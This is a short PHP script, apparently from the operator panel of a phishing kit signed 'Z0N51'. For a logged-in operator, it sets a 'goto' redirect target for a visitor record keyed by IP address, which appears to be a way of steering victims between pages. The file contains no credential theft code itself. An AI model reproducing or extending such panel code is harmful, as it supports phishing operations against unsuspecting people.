<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    include_once 'inc/app.php';

    if( !is_logged() ) {
        header("location: index.php");
        exit();
    }
    
    $check = get_data('data',['ip' => $_POST['ip']]);
    if( $check == 0 ) {
        return false;
    }

    $update = update_data('data',['goto' => $_POST['to']],['ip' => $_POST['ip']]);

    echo 'success';

?>
